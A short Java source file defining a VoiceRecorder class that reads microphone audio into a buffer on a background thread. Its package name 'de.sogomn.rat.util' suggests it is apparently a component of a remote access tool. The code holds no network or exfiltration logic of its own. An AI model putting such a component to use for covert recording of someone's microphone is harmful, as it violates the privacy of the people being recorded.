package de.sogomn.rat.util;

import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.TargetDataLine;

public final class VoiceRecorder {
	
	private TargetDataLine line;
	private Thread thread;
	private boolean running;
	
	private byte[] data;
	
	public VoiceRecorder(final int bufferSize) {
		data = new byte[bufferSize];
	}
	
	public void start() {
		if (running) {
			return;
		}
		
		final Runnable runnable = () -> {
			while (running) {
				line.read(data, 0, data.length);
			}
		};
		
		try {
			line = AudioSystem.getTargetDataLine(null);
			thread = new Thread(runnable);
			running = true;
			
			line.open();
			line.start();
			thread.start();
		} catch (final LineUnavailableException ex) {
			running = false;
			data = new byte[0];
		}
	}
	
	public void stop() {
		if (!running) {
			return;
		}
		
		running = false;
		
		thread.interrupt();
		line.stop();
		line.close();
		
		thread = null;
		line = null;
	}
	
	public boolean isRunning() {
		return running;
	}
	
	public byte[] getLastRecord() {
		return data;
	}
	
}
